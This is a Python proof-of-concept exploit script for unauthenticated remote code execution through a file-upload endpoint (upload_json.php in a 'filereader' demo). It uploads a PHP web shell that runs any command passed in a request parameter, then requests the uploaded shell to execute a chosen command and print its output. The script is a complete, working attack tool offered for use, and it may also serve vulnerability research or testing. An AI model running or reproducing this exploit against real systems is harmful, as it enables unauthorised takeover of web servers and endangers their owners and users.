#!/usr/bin/env python3
import argparse
import json
import sys
import uuid
from urllib.parse import urljoin

import requests


def build_shell_payload() -> bytes:
    return (
        b'<?php echo "WSBEGIN\\n"; '
        b'system($_REQUEST["cmd"] ?? "id"); '
        b'echo "WSEND\\n"; ?>'
    )


def extract_output(text: str) -> str:
    begin = text.find("WSBEGIN")
    end = text.find("WSEND")
    if begin != -1 and end != -1 and end > begin:
        return text[begin + len("WSBEGIN"):end].strip()
    return text.strip()


def main() -> int:
    parser = argparse.ArgumentParser(
        description="Exploit unauthenticated upload->RCE via upload_json.php"
    )
    parser.add_argument("base_url", help="Target base URL, e.g. http://127.0.0.1:8080")
    parser.add_argument("cmd", nargs="?", default="id", help="Command to execute")
    parser.add_argument("--timeout", type=int, default=15, help="HTTP timeout")
    parser.add_argument("--shell-name", help="Override uploaded webshell filename")
    args = parser.parse_args()

    base = args.base_url.rstrip("/") + "/"
    upload_url = urljoin(base, "demos/demos/filereader/upload_json.php")
    shell_name = args.shell_name or f"ws_json_{uuid.uuid4().hex[:8]}.php"
    shell_code = build_shell_payload()

    files = {
        "pictures[]": (shell_name, shell_code, "application/x-php"),
    }

    print(f"[*] Target base      : {base}")
    print(f"[*] Upload endpoint  : {upload_url}")
    print(f"[*] Shell filename   : {shell_name}")
    print("[*] Uploading webshell via upload_json.php ...")

    resp = requests.post(upload_url, files=files, timeout=args.timeout)
    print(f"[*] Upload status    : {resp.status_code}")
    print(f"[*] Upload response  : {resp.text.strip()[:500]}")

    shell_url = urljoin(base, f"demos/demos/filereader/upload/{shell_name}")
    try:
        data = resp.json()
        if isinstance(data, list) and data:
            src = data[0].get("src")
            if src:
                shell_url = urljoin(upload_url, src)
    except (json.JSONDecodeError, ValueError, AttributeError, IndexError, TypeError):
        pass

    print(f"[*] Shell URL        : {shell_url}")
    print(f"[*] Command          : {args.cmd}")
    trigger = requests.get(shell_url, params={"cmd": args.cmd}, timeout=args.timeout)
    print(f"[*] Trigger status   : {trigger.status_code}")

    output = extract_output(trigger.text)
    print("[*] Command output:")
    print(output)

    if trigger.status_code == 200 and output:
        print("[+] RCE confirmed via upload_json.php")
        return 0

    print("[-] Exploit did not return a usable command output", file=sys.stderr)
    return 1


if __name__ == "__main__":
    raise SystemExit(main())

